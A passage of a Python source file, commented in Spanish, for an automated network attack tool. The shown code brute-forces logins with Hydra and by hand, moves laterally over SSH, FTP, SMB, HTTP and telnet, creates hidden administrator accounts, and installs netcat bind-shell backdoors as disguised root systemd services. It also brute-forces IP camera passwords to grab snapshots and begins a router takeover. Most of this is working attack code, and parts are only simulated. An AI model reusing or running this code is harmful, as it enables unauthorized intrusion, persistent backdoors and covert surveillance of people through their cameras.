            if service['port'] not in [22, 21, 23, 80, 443, 445]:
                hydra_cmd.extend(['-s', str(service['port'])])
            
            print(f"🔍 Ejecutando Hydra: {' '.join(hydra_cmd)}")
            
            # Ejecutar Hydra
            result = self._run_command(hydra_cmd, timeout=300)  # 5 minutos timeout
            
            # Limpiar archivos temporales
            os.unlink(users_file.name)
            os.unlink(passwords_file.name)
            
            if result['success'] and result['stdout']:
                # Parsear salida de Hydra
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'login:' in line and 'password:' in line:
                        # Extraer credenciales
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[1].replace('login:', '')
                            password = parts[3].replace('password:', '')
                            return {
                                'username': username,
                                'password': password
                            }
            
            return None
            
        except Exception as e:
            print(f"❌ Error en fuerza bruta real: {e}")
            return None
    
    def _test_default_credentials(self) -> List[Dict[str, Any]]:
        """Probar credenciales por defecto"""
        credentials = []
        services = self.report['phase_1_reconnaissance']['services_found']
        
        for service in services:
            for user in self.config['default_users']:
                for password in self.config['default_passwords']:
                    if self._test_credential(service, user, password):
                        cred = {
                            'host': service['host'],
                            'port': service['port'],
                            'service': service['service'],
                            'username': user,
                            'password': password,
                            'method': 'default_credentials',
                            'timestamp': time.time()
                        }
                        credentials.append(cred)
                        break
        
        return credentials
    
    def _test_credential(self, service: Dict[str, Any], username: str, password: str) -> bool:
        """Probar una credencial específica"""
        # Simular prueba de credencial
        return hash(f"{service['host']}{username}{password}") % 5 == 0
    
    def _sniff_credentials(self) -> List[Dict[str, Any]]:
        """Sniffing de credenciales en tráfico"""
        credentials = []
        
        # Simular sniffing exitoso
        if hash(self.report['metadata']['target_network']) % 2 == 0:
            cred = {
                'host': '192.168.1.100',
                'port': 80,
                'service': 'http',
                'username': 'user',
                'password': 'password123',
                'method': 'sniffing',
                'timestamp': time.time()
            }
            credentials.append(cred)
        
        return credentials
    
    def phase_3_lateral_movement(self):
        """Fase 3: Movimiento lateral"""
        print("\n🚀 FASE 3: MOVIMIENTO LATERAL")
        print("=" * 50)
        
        self.report['phase_3_lateral_movement']['status'] = 'running'
        
        try:
            credentials = self.report['phase_2_credentials']['credentials_found']
            
            # 1. Explotar credenciales encontradas
            print("🔓 Explotando credenciales encontradas...")
            compromised = self._exploit_credentials(credentials)
            self.report['phase_3_lateral_movement']['compromised_systems'] = compromised
            
            # 2. Establecer conexiones laterales
            print("🔗 Estableciendo conexiones laterales...")
            lateral_conns = self._establish_lateral_connections(compromised)
            self.report['phase_3_lateral_movement']['lateral_connections'] = lateral_conns
            
            self.report['phase_3_lateral_movement']['status'] = 'completed'
            print(f"✅ Movimiento lateral completado: {len(compromised)} sistemas comprometidos")
            
        except Exception as e:
            self.report['phase_3_lateral_movement']['status'] = 'error'
            self.report['phase_3_lateral_movement']['errors'].append(str(e))
            print(f"❌ Error en movimiento lateral: {e}")
    
    def _exploit_credentials(self, credentials: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Explotar credenciales encontradas"""
        compromised = []
        
        for cred in credentials:
            print(f"🔓 Explotando {cred['host']} con {cred['username']}:{cred['password']}")
            
            # Ejecutar explotación real
            if self._real_exploitation(cred):
                comp_system = {
                    'host': cred['host'],
                    'port': cred['port'],
                    'service': cred['service'],
                    'username': cred['username'],
                    'password': cred['password'],
                    'access_level': 'user',
                    'timestamp': time.time()
                }
                compromised.append(comp_system)
        
        return compromised
    
    def _real_exploitation(self, cred: Dict[str, Any]) -> bool:
        """Ejecutar explotación real de credencial"""
        try:
            if cred['service'] == 'ssh':
                return self._test_ssh_connection(cred)
            elif cred['service'] == 'ftp':
                return self._test_ftp_connection(cred)
            elif cred['service'] == 'smb':
                return self._test_smb_connection(cred)
            elif cred['service'] in ['http', 'https']:
                return self._test_http_connection(cred)
            else:
                return self._test_generic_connection(cred)
        except Exception as e:
            print(f"❌ Error en explotación real: {e}")
            return False
    
    def _test_ssh_connection(self, cred: Dict[str, Any]) -> bool:
        """Probar conexión SSH real"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                cred['host'],
                port=cred['port'],
                username=cred['username'],
                password=cred['password'],
                timeout=10
            )
            
            # Ejecutar comando simple para verificar
            stdin, stdout, stderr = ssh.exec_command('whoami')
            result = stdout.read().decode().strip()
            
            ssh.close()
            
            if result:
                print(f"✅ SSH exitoso: {cred['username']}@{cred['host']} -> {result}")
                return True
            
        except ImportError:
            print("⚠️ Paramiko no disponible, usando ssh command")
            # Fallback a comando ssh
            ssh_cmd = [
                'ssh',
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', 'ConnectTimeout=10',
                f"{cred['username']}@{cred['host']}",
                'whoami'
            ]
            
            result = self._run_command(ssh_cmd, timeout=15)
            if result['success']:
                print(f"✅ SSH exitoso: {cred['username']}@{cred['host']}")
                return True
        except Exception as e:
            print(f"❌ SSH falló: {e}")
        
        return False
    
    def _test_ftp_connection(self, cred: Dict[str, Any]) -> bool:
        """Probar conexión FTP real"""
        try:
            from ftplib import FTP
            
            ftp = FTP()
            ftp.connect(cred['host'], cred['port'], timeout=10)
            ftp.login(cred['username'], cred['password'])
            
            # Listar directorio para verificar
            files = ftp.nlst()
            ftp.quit()
            
            print(f"✅ FTP exitoso: {cred['username']}@{cred['host']} -> {len(files)} archivos")
            return True
            
        except ImportError:
            print("⚠️ ftplib no disponible, usando ftp command")
            # Fallback a comando ftp
            ftp_script = f"""
open {cred['host']} {cred['port']}
user {cred['username']} {cred['password']}
ls
quit
"""
            
            result = self._run_command(['ftp', '-n'], input=ftp_script, timeout=15)
            if result['success'] and '230' in result['stdout']:
                print(f"✅ FTP exitoso: {cred['username']}@{cred['host']}")
                return True
        except Exception as e:
            print(f"❌ FTP falló: {e}")
        
        return False
    
    def _test_smb_connection(self, cred: Dict[str, Any]) -> bool:
        """Probar conexión SMB real"""
        try:
            # Usar smbclient para probar conexión
            smb_cmd = [
                'smbclient',
                f"//{cred['host']}/IPC$",
                '-U', f"{cred['username']}%{cred['password']}",
                '-c', 'ls'
            ]
            
            result = self._run_command(smb_cmd, timeout=15)
            if result['success']:
                print(f"✅ SMB exitoso: {cred['username']}@{cred['host']}")
                return True
        except Exception as e:
            print(f"❌ SMB falló: {e}")
        
        return False
    
    def _test_http_connection(self, cred: Dict[str, Any]) -> bool:
        """Probar conexión HTTP real"""
        try:
            import urllib.request
            import urllib.parse
            import base64
            
            # Crear autenticación básica
            auth_string = f"{cred['username']}:{cred['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Determinar protocolo
            protocol = 'https' if cred['service'] == 'https' else 'http'
            url = f"{protocol}://{cred['host']}:{cred['port']}/"
            
            # Crear request con autenticación
            req = urllib.request.Request(url)
            req.add_header('Authorization', f'Basic {auth_b64}')
            
            # Realizar request
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"✅ HTTP exitoso: {cred['username']}@{cred['host']}")
                    return True
        except Exception as e:
            print(f"❌ HTTP falló: {e}")
        
        return False
    
    def _test_generic_connection(self, cred: Dict[str, Any]) -> bool:
        """Probar conexión genérica con telnet"""
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(cred['host'], cred['port'], timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(cred['username'].encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(cred['password'].encode('ascii') + b"\n")
            
            # Leer respuesta
            response = tn.read_some().decode('ascii', errors='ignore')
            tn.close()
            
            if '$ ' in response or '> ' in response or '# ' in response:
                print(f"✅ Conexión genérica exitosa: {cred['username']}@{cred['host']}")
                return True
        except Exception as e:
            print(f"❌ Conexión genérica falló: {e}")
        
        return False
    
    def _establish_lateral_connections(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Establecer conexiones laterales"""
        connections = []
        
        for system in compromised:
            conn = {
                'from_host': system['host'],
                'to_hosts': [],
                'connection_type': 'ssh',
                'established': True,
                'timestamp': time.time()
            }
            
            # Simular conexiones a otros hosts
            for other_system in compromised:
                if other_system['host'] != system['host']:
                    conn['to_hosts'].append(other_system['host'])
            
            connections.append(conn)
        
        return connections
    
    def phase_4_persistence(self):
        """Fase 4: Persistencia y acceso remoto"""
        print("\n🔒 FASE 4: PERSISTENCIA Y ACCESO REMOTO")
        print("=" * 50)
        
        self.report['phase_4_persistence']['status'] = 'running'
        
        try:
            compromised = self.report['phase_3_lateral_movement']['compromised_systems']
            
            # 1. Crear usuarios persistentes
            print("👤 Creando usuarios persistentes...")
            users = self._create_persistent_users(compromised)
            self.report['phase_4_persistence']['users_created'] = users
            
            # 2. Crear backdoors
            print("🕳️ Creando backdoors...")
            backdoors = self._create_backdoors(compromised)
            self.report['phase_4_persistence']['backdoors_created'] = backdoors
            
            # 3. Establecer conexiones remotas
            print("🌐 Estableciendo conexiones remotas...")
            remote_conns = self._establish_remote_connections(compromised)
            self.report['phase_4_persistence']['remote_connections'] = remote_conns
            
            # 4. Configurar apuntadores C2
            print("🎯 Configurando apuntadores C2...")
            c2_pointers = self._setup_c2_pointers(compromised)
            self.report['phase_4_persistence']['c2_pointers'] = c2_pointers
            
            # 5. Acceder a cámaras detectadas
            print("📹 Accediendo a cámaras detectadas...")
            cameras_accessed = self._access_detected_cameras()
            self.report['phase_4_persistence']['cameras_accessed'] = cameras_accessed
            
            # 6. Acceder al router y configurar persistencia de red
            print("🌐 Accediendo al router y configurando persistencia de red...")
            router_access = self._access_router_and_configure_persistence()
            self.report['phase_4_persistence']['router_access'] = router_access
            
            # 7. Configurar métodos de acceso remoto
            print("🔗 Configurando métodos de acceso remoto...")
            network_persistence = self._configure_network_persistence()
            self.report['phase_4_persistence']['network_persistence'] = network_persistence
            
            # 8. Crear backdoors en servicios vulnerables
            print("🕳️ Creando backdoors en servicios vulnerables...")
            vulnerable_backdoors = self._create_vulnerable_service_backdoors()
            self.report['phase_4_persistence']['vulnerable_backdoors'] = vulnerable_backdoors
            
            self.report['phase_4_persistence']['status'] = 'completed'
            print(f"✅ Persistencia completada: {len(users)} usuarios, {len(backdoors)} backdoors")
            
        except Exception as e:
            self.report['phase_4_persistence']['status'] = 'error'
            self.report['phase_4_persistence']['errors'].append(str(e))
            print(f"❌ Error en persistencia: {e}")
    
    def _create_persistent_users(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Crear usuarios persistentes reales"""
        users = []
        
        for system in compromised:
            username = f'svc_{system["host"].replace(".", "_")}'
            password = f'P@ssw0rd_{system["host"].split(".")[-1]}!'
            
            # Intentar crear usuario real
            if self._create_real_user(system, username, password):
                user = {
                    'host': system['host'],
                    'username': username,
                    'password': password,
                    'groups': ['administrators', 'remote_desktop_users'],
                    'description': 'System Maintenance Service',
                    'created': True,
                    'timestamp': time.time()
                }
                users.append(user)
                print(f"✅ Usuario creado: {username}@{system['host']}")
            else:
                print(f"❌ Falló creación de usuario: {username}@{system['host']}")
        
        return users
    
    def _create_real_user(self, system: Dict[str, Any], username: str, password: str) -> bool:
        """Crear usuario real en el sistema"""
        try:
            if system['service'] == 'ssh':
                return self._create_user_via_ssh(system, username, password)
            elif system['service'] == 'smb':
                return self._create_user_via_smb(system, username, password)
            else:
                return self._create_user_generic(system, username, password)
        except Exception as e:
            print(f"❌ Error creando usuario real: {e}")
            return False
    
    def _create_user_via_ssh(self, system: Dict[str, Any], username: str, password: str) -> bool:
        """Crear usuario via SSH"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                system['host'],
                port=system['port'],
                username=system['username'],
                password=system['password'],
                timeout=10
            )
            
            # Comandos para crear usuario (Linux/Unix)
            commands = [
                f"sudo useradd -m -s /bin/bash {username}",
                f"echo '{username}:{password}' | sudo chpasswd",
                f"sudo usermod -aG sudo {username}",
                f"sudo usermod -aG wheel {username}"
            ]
            
            for cmd in commands:
                stdin, stdout, stderr = ssh.exec_command(cmd)
                exit_status = stdout.channel.recv_exit_status()
                if exit_status != 0:
                    print(f"⚠️ Comando falló: {cmd}")
            
            ssh.close()
            return True
            
        except ImportError:
            # Fallback a comando ssh
            for cmd in commands:
                ssh_cmd = [
                    'ssh',
                    '-o', 'StrictHostKeyChecking=no',
                    f"{system['username']}@{system['host']}",
                    cmd
                ]
                result = self._run_command(ssh_cmd, timeout=15)
                if not result['success']:
                    print(f"⚠️ Comando SSH falló: {cmd}")
            return True
        except Exception as e:
            print(f"❌ Error SSH: {e}")
            return False
    
    def _create_user_via_smb(self, system: Dict[str, Any], username: str, password: str) -> bool:
        """Crear usuario via SMB (Windows)"""
        try:
            # Usar net user command via SMB
            net_cmd = [
                'smbclient',
                f"//{system['host']}/C$",
                '-U', f"{system['username']}%{system['password']}",
                '-c', f"net user {username} {password} /add && net localgroup administrators {username} /add"
            ]
            
            result = self._run_command(net_cmd, timeout=30)
            return result['success']
        except Exception as e:
            print(f"❌ Error SMB: {e}")
            return False
    
    def _create_user_generic(self, system: Dict[str, Any], username: str, password: str) -> bool:
        """Crear usuario genérico"""
        # Para otros servicios, intentar comandos básicos
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(system['username'].encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(system['password'].encode('ascii') + b"\n")
            
            # Intentar crear usuario
            tn.write(f"useradd -m {username}\n".encode('ascii'))
            tn.write(f"passwd {username}\n".encode('ascii'))
            tn.write(f"{password}\n".encode('ascii'))
            tn.write(f"{password}\n".encode('ascii'))
            
            tn.close()
            return True
        except Exception as e:
            print(f"❌ Error genérico: {e}")
            return False
    
    def _create_backdoors(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Crear backdoors reales"""
        backdoors = []
        
        for system in compromised:
            port = 4444 + hash(system['host']) % 1000
            
            # Intentar crear backdoor real
            if self._create_real_backdoor(system, port):
                backdoor = {
                    'host': system['host'],
                    'type': 'netcat',
                    'port': port,
                    'method': 'reverse_shell',
                    'payload': f'nc -lvp {port} -e /bin/bash',
                    'created': True,
                    'timestamp': time.time()
                }
                backdoors.append(backdoor)
                print(f"✅ Backdoor creado: {system['host']}:{port}")
            else:
                print(f"❌ Falló creación de backdoor: {system['host']}:{port}")
        
        return backdoors
    
    def _create_real_backdoor(self, system: Dict[str, Any], port: int) -> bool:
        """Crear backdoor real en el sistema"""
        try:
            if system['service'] == 'ssh':
                return self._create_backdoor_via_ssh(system, port)
            else:
                return self._create_backdoor_generic(system, port)
        except Exception as e:
            print(f"❌ Error creando backdoor real: {e}")
            return False
    
    def _create_backdoor_via_ssh(self, system: Dict[str, Any], port: int) -> bool:
        """Crear backdoor via SSH"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                system['host'],
                port=system['port'],
                username=system['username'],
                password=system['password'],
                timeout=10
            )
            
            # Crear script de backdoor
            backdoor_script = f"""#!/bin/bash
while true; do
    nc -lvp {port} -e /bin/bash
    sleep 5
done
"""
            
            # Escribir script
            stdin, stdout, stderr = ssh.exec_command(f"cat > /tmp/.service_{port}.sh << 'EOF'\n{backdoor_script}EOF")
            
            # Hacer ejecutable
            stdin, stdout, stderr = ssh.exec_command(f"chmod +x /tmp/.service_{port}.sh")
            
            # Crear servicio systemd
            service_content = f"""[Unit]
Description=System Service {port}
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.service_{port}.sh
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
"""
            
            stdin, stdout, stderr = ssh.exec_command(f"cat > /etc/systemd/system/service_{port}.service << 'EOF'\n{service_content}EOF")
            
            # Habilitar y iniciar servicio
            stdin, stdout, stderr = ssh.exec_command("systemctl daemon-reload")
            stdin, stdout, stderr = ssh.exec_command(f"systemctl enable service_{port}.service")
            stdin, stdout, stderr = ssh.exec_command(f"systemctl start service_{port}.service")
            
            ssh.close()
            return True
            
        except ImportError:
            # Fallback a comando ssh
            commands = [
                f"cat > /tmp/.service_{port}.sh << 'EOF'\n{backdoor_script}EOF",
                f"chmod +x /tmp/.service_{port}.sh",
                f"cat > /etc/systemd/system/service_{port}.service << 'EOF'\n{service_content}EOF",
                "systemctl daemon-reload",
                f"systemctl enable service_{port}.service",
                f"systemctl start service_{port}.service"
            ]
            
            for cmd in commands:
                ssh_cmd = [
                    'ssh',
                    '-o', 'StrictHostKeyChecking=no',
                    f"{system['username']}@{system['host']}",
                    cmd
                ]
                result = self._run_command(ssh_cmd, timeout=15)
                if not result['success']:
                    print(f"⚠️ Comando SSH falló: {cmd}")
            return True
        except Exception as e:
            print(f"❌ Error SSH backdoor: {e}")
            return False
    
    def _create_backdoor_generic(self, system: Dict[str, Any], port: int) -> bool:
        """Crear backdoor genérico"""
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(system['username'].encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(system['password'].encode('ascii') + b"\n")
            
            # Crear backdoor simple
            tn.write(f"nohup nc -lvp {port} -e /bin/bash &\n".encode('ascii'))
            
            tn.close()
            return True
        except Exception as e:
            print(f"❌ Error backdoor genérico: {e}")
            return False
    
    def _establish_remote_connections(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Establecer conexiones remotas"""
        connections = []
        
        for system in compromised:
            conn = {
                'host': system['host'],
                'type': 'ssh',
                'port': 22,
                'username': f'svc_{system["host"].replace(".", "_")}',
                'password': f'P@ssw0rd_{system["host"].split(".")[-1]}!',
                'persistent': True,
                'auto_reconnect': True,
                'timestamp': time.time()
            }
            connections.append(conn)
        
        return connections
    
    def _setup_c2_pointers(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Configurar apuntadores C2"""
        pointers = []
        
        for system in compromised:
            pointer = {
                'host': system['host'],
                'c2_server': '192.168.1.200',
                'c2_port': 8080,
                'checkin_interval': 300,  # 5 minutos
                'method': 'http_post',
                'encrypted': True,
                'timestamp': time.time()
            }
            pointers.append(pointer)
        
        return pointers
    
    def _access_detected_cameras(self) -> List[Dict[str, Any]]:
        """Acceder a cámaras detectadas en la red"""
        cameras_accessed = []
        
        # Buscar cámaras en servicios encontrados
        services = self.report['phase_1_reconnaissance']['services_found']
        cameras = self._identify_camera_services(services)
        
        for camera in cameras:
            print(f"📹 Procesando cámara: {camera['host']}:{camera['port']}")
            
            # Intentar acceso a la cámara
            camera_access = self._exploit_camera(camera)
            if camera_access:
                cameras_accessed.append(camera_access)
                print(f"✅ Acceso exitoso a cámara: {camera['host']}")
            else:
                print(f"❌ Falló acceso a cámara: {camera['host']}")
        
        return cameras_accessed
    
    def _identify_camera_services(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Identificar servicios que podrían ser cámaras"""
        cameras = []
        
        for service in services:
            # Verificar si es un puerto común de cámara
            if service['port'] in self.config['camera_ports']:
                # Verificar si el servicio sugiere que es una cámara
                service_name = service.get('service', '').lower()
                version = service.get('version', '').lower()
                
                camera_indicators = [
                    'http', 'https', 'rtsp', 'camera', 'ipcam', 'webcam',
                    'dvr', 'nvr', 'surveillance', 'security', 'monitor'
                ]
                
                if any(indicator in service_name or indicator in version for indicator in camera_indicators):
                    camera = {
                        'host': service['host'],
                        'port': service['port'],
                        'service': service['service'],
                        'version': service['version'],
                        'protocol': 'http' if service['port'] in [80, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999] else 'rtsp',
                        'detected_as_camera': True
                    }
                    cameras.append(camera)
                
                # También agregar si está en puertos específicos de cámaras
                elif service['port'] in [554, 1935]:  # RTSP, RTMP
                    camera = {
                        'host': service['host'],
                        'port': service['port'],
                        'service': service['service'],
                        'version': service['version'],
                        'protocol': 'rtsp',
                        'detected_as_camera': True
                    }
                    cameras.append(camera)
        
        return cameras
    
    def _exploit_camera(self, camera: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Explotar cámara específica"""
        try:
            # 1. Detectar tipo de cámara
            camera_type = self._detect_camera_type(camera)
            
            # 2. Intentar credenciales por defecto
            credentials = self._brute_force_camera_credentials(camera)
            
            if credentials:
                # 3. Obtener información de la cámara
                camera_info = self._get_camera_information(camera, credentials)
                
                # 4. Tomar screenshots de prueba
                screenshots = self._capture_camera_screenshots(camera, credentials)
                
                # 5. Generar URLs de acceso
                access_urls = self._generate_camera_urls(camera, credentials)
                
                return {
                    'host': camera['host'],
                    'port': camera['port'],
                    'protocol': camera['protocol'],
                    'camera_type': camera_type,
                    'credentials': credentials,
                    'camera_info': camera_info,
                    'screenshots': screenshots,
                    'access_urls': access_urls,
                    'timestamp': time.time()
                }
            
            return None
            
        except Exception as e:
            print(f"❌ Error explotando cámara {camera['host']}: {e}")
            return None
    
    def _detect_camera_type(self, camera: Dict[str, Any]) -> str:
        """Detectar tipo de cámara"""
        try:
            # Hacer request HTTP para detectar tipo
            import urllib.request
            import urllib.error
            
            url = f"http://{camera['host']}:{camera['port']}/"
            
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                html_content = response.read().decode('utf-8', errors='ignore')
                
                # Detectar marcas comunes
                if 'hikvision' in html_content.lower():
                    return 'hikvision'
                elif 'dahua' in html_content.lower():
                    return 'dahua'
                elif 'axis' in html_content.lower():
                    return 'axis'
                elif 'foscam' in html_content.lower():
                    return 'foscam'
                elif 'dlink' in html_content.lower():
                    return 'dlink'
                elif 'tp-link' in html_content.lower():
                    return 'tp-link'
                elif 'xiaomi' in html_content.lower():
                    return 'xiaomi'
                else:
                    return 'generic_ip_camera'
                    
        except Exception as e:
            print(f"⚠️ No se pudo detectar tipo de cámara: {e}")
            return 'unknown'
    
    def _brute_force_camera_credentials(self, camera: Dict[str, Any]) -> Optional[Dict[str, str]]:
        """Fuerza bruta específica para cámaras"""
        try:
            import urllib.request
            import urllib.error
            import base64
            
            for username in self.config['camera_users']:
                for password in self.config['camera_passwords']:
                    try:
                        # Crear autenticación básica
                        auth_string = f"{username}:{password}"
                        auth_bytes = auth_string.encode('ascii')
                        auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
                        
                        # Intentar acceso
                        url = f"http://{camera['host']}:{camera['port']}/"
                        req = urllib.request.Request(url)
                        req.add_header('Authorization', f'Basic {auth_b64}')
                        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                        
                        with urllib.request.urlopen(req, timeout=5) as response:
                            if response.status == 200:
                                print(f"✅ Credenciales encontradas: {username}:{password}")
                                return {'username': username, 'password': password}
                                
                    except urllib.error.HTTPError as e:
                        if e.code == 401:  # Unauthorized
                            continue
                        elif e.code == 200:  # Success
                            print(f"✅ Credenciales encontradas: {username}:{password}")
                            return {'username': username, 'password': password}
                    except Exception:
                        continue
            
            return None
            
        except Exception as e:
            print(f"❌ Error en fuerza bruta de cámara: {e}")
            return None
    
    
    def _get_camera_information(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> Dict[str, Any]:
        """Obtener información detallada de la cámara"""
        try:
            import urllib.request
            import base64
            import json
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            camera_info = {
                'model': 'unknown',
                'firmware': 'unknown',
                'resolution': 'unknown',
                'features': [],
                'capabilities': []
            }
            
            # Intentar obtener información de la página principal
            try:
                url = f"http://{camera['host']}:{camera['port']}/"
                req = urllib.request.Request(url)
                req.add_header('Authorization', f'Basic {auth_b64}')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    html_content = response.read().decode('utf-8', errors='ignore')
                    
                    # Extraer información básica del HTML
                    if 'resolution' in html_content.lower():
                        camera_info['resolution'] = 'detected'
                    if 'ptz' in html_content.lower():
                        camera_info['features'].append('ptz')
                    if 'night' in html_content.lower() or 'ir' in html_content.lower():
                        camera_info['features'].append('night_vision')
                    if 'audio' in html_content.lower():
                        camera_info['features'].append('audio')
                    
            except Exception:
                pass
            
            # Intentar obtener información de API si está disponible
            api_endpoints = [
                '/api/system/deviceInfo',
                '/cgi-bin/magicBox.cgi?action=getDeviceType',
                '/cgi-bin/global.cgi',
                '/api/v1/device/info'
            ]
            
            for endpoint in api_endpoints:
                try:
                    url = f"http://{camera['host']}:{camera['port']}{endpoint}"
                    req = urllib.request.Request(url)
                    req.add_header('Authorization', f'Basic {auth_b64}')
                    
                    with urllib.request.urlopen(req, timeout=5) as response:
                        if response.status == 200:
                            content = response.read().decode('utf-8', errors='ignore')
                            
                            # Intentar parsear como JSON
                            try:
                                data = json.loads(content)
                                if 'model' in data:
                                    camera_info['model'] = data['model']
                                if 'firmware' in data:
                                    camera_info['firmware'] = data['firmware']
                            except:
                                # Si no es JSON, buscar en texto plano
                                if 'model' in content.lower():
                                    camera_info['model'] = 'detected'
                                if 'firmware' in content.lower():
                                    camera_info['firmware'] = 'detected'
                            
                            break
                            
                except Exception:
                    continue
            
            return camera_info
            
        except Exception as e:
            print(f"❌ Error obteniendo información de cámara: {e}")
            return {'error': str(e)}
    
    
    def _generate_camera_urls(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> Dict[str, List[str]]:
        """Generar URLs de acceso a la cámara"""
        urls = {
            'web_interface': [],
            'streaming': [],
            'snapshots': [],
            'control': []
        }
        
        base_url = f"http://{camera['host']}:{camera['port']}"
        auth_url = f"http://{credentials['username']}:{credentials['password']}@{camera['host']}:{camera['port']}"
        
        # Interfaz web
        urls['web_interface'] = [
            f"{auth_url}/",
            f"{auth_url}/index.html",
            f"{auth_url}/login.html",
            f"{auth_url}/main.html"
        ]
        
        # Streaming
        urls['streaming'] = [
            f"{auth_url}/video.mjpg",
            f"{auth_url}/mjpeg",
            f"{auth_url}/stream",
            f"{auth_url}/live"
        ]
        
        # Capturas
        urls['snapshots'] = [
            f"{auth_url}/snapshot.cgi",
            f"{auth_url}/image",
            f"{auth_url}/snapshot",
            f"{auth_url}/jpg"
        ]
        
        # Control
        urls['control'] = [
            f"{auth_url}/cgi-bin/ptz.cgi",
            f"{auth_url}/cgi-bin/control.cgi",
            f"{auth_url}/api/ptz",
            f"{auth_url}/control"
        ]
        
        return urls
    
    def _capture_camera_screenshots(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> List[str]:
        """Capturar screenshots de prueba de la cámara"""
        screenshots = []
        
        try:
            import urllib.request
            import os
            import time
            
            # Crear directorio para screenshots
            screenshot_dir = f"camera_screenshots_{int(time.time())}"
            os.makedirs(screenshot_dir, exist_ok=True)
            
            host = camera['host']
            port = camera['port']
            
            print(f"📸 Capturando screenshots de prueba de {host}...")
            
            # URLs comunes para captura de imagen
            snapshot_urls = [
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/snapshot.cgi",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/image",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/snapshot",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/jpg",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/jpeg",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/cgi-bin/snapshot.cgi",
                f"http://{credentials['username']}:{credentials['password']}@{host}:{port}/axis-cgi/jpg/image.cgi"
            ]
            
            screenshot_count = 0
            
            for i, url in enumerate(snapshot_urls):
                if screenshot_count >= 2:  # Solo 2 screenshots de prueba
                    break
                    
                try:
                    req = urllib.request.Request(url)
                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                    
                    with urllib.request.urlopen(req, timeout=10) as response:
                        if response.status == 200:
                            # Verificar que sea una imagen
                            content_type = response.headers.get('Content-Type', '')
                            if 'image' in content_type or 'jpeg' in content_type or 'jpg' in content_type:
                                screenshot_file = os.path.join(screenshot_dir, f"{host}_screenshot_{screenshot_count + 1}.jpg")
                                
                                with open(screenshot_file, 'wb') as f:
                                    f.write(response.read())
                                
                                screenshots.append(screenshot_file)
                                screenshot_count += 1
                                
                                print(f"   ✅ Screenshot {screenshot_count}: {screenshot_file}")
                                
                                # Pequeña pausa entre capturas
                                time.sleep(1)
                            
                except Exception as e:
                    continue
            
            if screenshots:
                print(f"✅ Capturados {len(screenshots)} screenshots de {host}")
            else:
                print(f"⚠️ No se pudieron capturar screenshots de {host}")
            
            return screenshots
            
        except Exception as e:
            print(f"❌ Error capturando screenshots: {e}")
            return []
    
    def _access_router_and_configure_persistence(self) -> List[Dict[str, Any]]:
        """Acceder al router y configurar persistencia de red"""
        router_access = []
        
        try:
            # Obtener gateway detectado
            gateway = self.network_config.get('gateway')
            if not gateway:
                print("❌ No se detectó gateway para acceso al router")
                return router_access
            
            print(f"🌐 Intentando acceso al router: {gateway}")
            
            # Detectar tipo de router
            router_type = self._detect_router_type(gateway)
            
            # Intentar credenciales por defecto
            router_credentials = self._brute_force_router_credentials(gateway)
            
            if router_credentials:
                # Configurar acceso persistente al router
                router_config = self._configure_router_persistence(gateway, router_credentials, router_type)
                
                router_access.append({
                    'gateway': gateway,
                    'router_type': router_type,
                    'credentials': router_credentials,
                    'configuration': router_config,
                    'timestamp': time.time()
                })
                
                print(f"✅ Acceso al router configurado: {gateway}")
